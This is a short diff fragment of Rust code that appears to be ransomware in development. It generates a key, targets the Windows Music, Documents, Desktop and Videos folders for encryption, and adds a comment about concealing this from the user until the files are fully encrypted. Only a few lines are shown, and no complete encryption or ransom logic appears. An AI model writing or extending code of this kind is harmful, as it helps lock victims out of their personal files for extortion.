@@ -29,6 +29,7 @@ fn desktop_file_path(filename: &str) -> Result<PathBuf> {
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     sodiumoxide::init().unwrap();
 
+    // only reveal to user once the files are fully encrypted?
     let pk: PublicKey = gen_key().await?;
 
     let paths = [FOLDERID_Music, FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Videos];
